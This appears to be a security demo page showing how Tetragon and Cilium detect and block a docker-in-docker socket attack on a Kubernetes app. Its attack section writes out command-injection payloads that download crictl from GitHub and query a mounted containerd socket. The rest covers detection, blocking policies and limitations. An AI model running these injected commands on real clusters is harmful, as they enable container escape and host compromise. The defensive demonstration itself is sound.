# Scenario 2 — DIND (docker-in-docker) socket exploitation

**Coverage:** 🛑 Block · 🔍 Identify · Control: **Tetragon socket kill + Cilium egress lock**
**Target:** `health-check` deployment, `default` namespace (`http://127.0.0.1:1231`)

## The attack
The app has command injection (`127.0.0.1; id`). The attacker finds a container
runtime socket mounted into the pod (`/custom/containerd/containerd.sock`),
downloads the `crictl` binary from GitHub, and talks to the host runtime:

```bash
; mount                                   # reveals the mounted socket
; wget https://github.com/.../crictl-...tar.gz -O /tmp/c.tgz
; tar -xf /tmp/c.tgz -C /tmp
; /tmp/crictl -r unix:///custom/containerd/containerd.sock images
```

## Identify (Tetragon)
Watch the pod — you'll see the injected shell, the `wget`, and the open of the
socket path:

```bash
kubectl -n kube-system exec ds/tetragon -c tetragon -- \
  tetra getevents -o compact --pods health-check
# process_exec /bin/sh -c ...; id
# process_exec /usr/bin/wget ...
# ⚡ file open /custom/containerd/containerd.sock
```

## Block — two independent layers
**1. Tetragon kills any access to the runtime socket** (works even though the
socket is mounted):

```bash
kubectl apply -f policies/tetragon/02-container-socket-abuse.yaml
# any process that open()s containerd.sock / docker.sock is Sigkill'd
```

**2. Cilium egress lock stops the tool download** — if the pod can't reach
GitHub, the attacker can't fetch `crictl`:

```bash
kubectl apply -f policies/dns-l7/dns-allowlist-egress.yaml   # (scope to app=health-check)
```

Re-run the exploit: the `wget` is denied by Cilium *and* any socket touch is
killed by Tetragon.

## Talk track
> "Even accepting that the app got popped and the socket is mounted, the attack
> needs two things — pull a tool from the internet and talk to the socket. We cut
> both: default-deny egress means the download fails, and Tetragon Sigkills the
> instant anything opens that socket. eBPF sees the syscall; there's nowhere to hide."

## Limitations / honesty
The real fix is to **not mount the runtime socket** into workloads (admission
policy — see scenario 22) and to fix the command injection. Tetragon + egress
lock are the runtime/network backstops for when those fail.
